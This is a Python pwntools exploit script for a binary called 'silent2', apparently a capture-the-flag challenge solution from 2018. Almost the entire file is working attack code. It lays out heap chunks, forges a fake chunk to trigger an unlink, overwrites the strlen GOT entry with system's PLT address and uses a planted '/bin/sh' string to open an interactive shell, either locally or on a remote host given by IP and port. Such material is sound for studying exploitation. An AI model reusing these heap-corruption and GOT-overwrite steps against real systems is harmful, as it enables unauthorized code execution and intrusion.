## file: exp for silent2## date: 2018-04-26## author: raycp

from pwn import *
from ctypes import *

DEBUG = 1
if DEBUG:
     p = process('./silent2')
     #scontext.log_level = 'debug'
     #libc = ELF('/lib32/libc-2.24.so')
     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})
     lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     
else:
     p = remote('39.107.33.43', 13570)
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #libc = ELF('libc_64.so.6')
#context.log_level = 'debug'

def add(size,data):
    sleep(0.5)
    p.sendline('1\n')
    sleep(0.25)
    p.sendline(str(size))
    sleep(0.25)
    p.send(data)

def edit(idx,data,data2):
    sleep(0.25)
    p.sendline('3\n')
    sleep(0.25)
    p.sendline(str(idx))
    sleep(0.25)
    p.send(data)
    sleep(0.25)
    p.send(data2)

def delete(idx):
    sleep(0.5)
    p.sendline('2\n')
    sleep(0.25)
    p.sendline(str(idx))
    
array_addr=0x6020C0+6*8
strlen_got=0x0000000000602020
system_plt=0x400730
def pwn():
    add(0x80,'a'*(0x80-1)) #0
    add(0x80,'a'*(0x80-1)) #1
    add(0x80,'a'*(0x80-1)) #2
    add(0x80,'a'*(0xa0-1)) #3
    add(0x80,'a'*(0x80-1)) #4

    add(0x80,'a'*(0x80-1)) #5
    add(0xb0,'a'*(0xa0-1)) #6
    add(0x80,'/bin/sh\x00'.ljust(0x80-1)) #7
    
    
    delete(6)
    delete(7)
    chunk=p64(0x0)+p64(0x81)+p64(array_addr-0x18)+p64(array_addr-0x10)
    chunk=chunk.ljust(0x80,'a')
    chunk+=p64(0x80)+p64(0x90)+'a'*0x80+p64(0)+p64(0x31)
    add(0x140,chunk.ljust(0x140-1,'a')) #8
    
    delete(0x7)
    edit(6,p32(strlen_got),'a'*47)
    edit(3,p32(system_plt)+'\x00'*2,'a'*47)
    
    #gdb.attach(p,'b*0x400b87')
    sleep(0.25)
    p.sendline('3\n')
    sleep(0.25)
    p.sendline('8')
    sleep(0.25)
    p.interactive()

if __name__ == '__main__':
   pwn()



 

    
